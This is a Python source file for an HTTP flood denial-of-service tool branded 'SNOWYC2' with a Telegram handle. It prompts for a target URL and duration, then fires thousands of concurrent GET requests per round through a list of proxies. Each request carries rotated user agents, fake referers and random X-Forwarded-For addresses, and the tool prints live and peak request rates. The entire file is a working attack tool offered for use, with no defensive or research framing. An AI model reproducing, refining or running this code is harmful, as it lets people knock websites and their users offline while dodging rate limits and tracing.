import asyncio
import aiohttp
import random
import sys
import time

# Config
MAX_CONCURRENT = 4000
REQUEST_TIMEOUT = 10

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

REFERERS = [
    "https://www.google.com/", "https://www.facebook.com/", "https://www.youtube.com/",
    "https://www.reddit.com/", "https://www.instagram.com/", "https://www.linkedin.com/",
    "https://www.tiktok.com/", "https://www.twitter.com/", "https://news.ycombinator.com/",
    "https://www.pinterest.com/", "https://www.quora.com/"
]

VALID_METHODS = ["C-ECLIPSE"]

# Load proxies from file
def load_proxies():
    try:
        with open("proxy.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("proxy.txt not found or empty.")
        return []

class AttackEngine:
    def __init__(self, method, target, duration, proxies):
        self.method = method
        self.target = target
        self.time = duration
        self.start_time = 0
        self.proxies = proxies
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }
        self.semaphore = asyncio.Semaphore(1000)

    async def make_request(self, proxy):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }

        conn = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)

        try:
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
                proxy_url = f"http://{proxy}"
                async with session.get(self.target, headers=headers, proxy=proxy_url) as response:
                    if response.status == 200:
                        return "SUCCESS"
                    elif str(response.status).startswith("4"):
                        return "ERROR"
                    return "OTHER"
        except:
            return "ERROR"

    async def run_attack(self):
        self.start_time = time.time()
        end_time = self.start_time + self.time

        while time.time() < end_time:
            tasks = []
            for _ in range(MAX_CONCURRENT):
                proxy = random.choice(self.proxies)
                tasks.append(asyncio.create_task(self.make_request(proxy)))

            results = await asyncio.gather(*tasks)

            self.stats['total'] += len(results)
            self.stats['success'] += results.count("SUCCESS")
            self.stats['errors'] += results.count("ERROR")

            elapsed = time.time() - self.start_time
            current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
            self.stats['rps'] = current_rps
            self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)

            self.print_status()

    def print_status(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.time - elapsed)
        sys.stdout.write("\033[H\033[J")
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM | METHOD: {self.method}")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" TIME LEFT: {remaining:.1f}s")
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print("=" * 60)

    def print_summary(self):
        total_time = time.time() - self.start_time
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print(f" AVERAGE RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 40)

    method = input("METHOD: ").strip().upper()
    if method not in VALID_METHODS:
        print("Invalid method.")
        return

    target = input("TARGET URL: ").strip()
    duration = int(input("TIME (seconds): ").strip())

    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"

    proxies = load_proxies()
    if not proxies:
        print("No proxies loaded.")
        return

    engine = AttackEngine(method, target, duration, proxies)

    try:
        asyncio.run(engine.run_attack())
        engine.print_summary()
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    main()
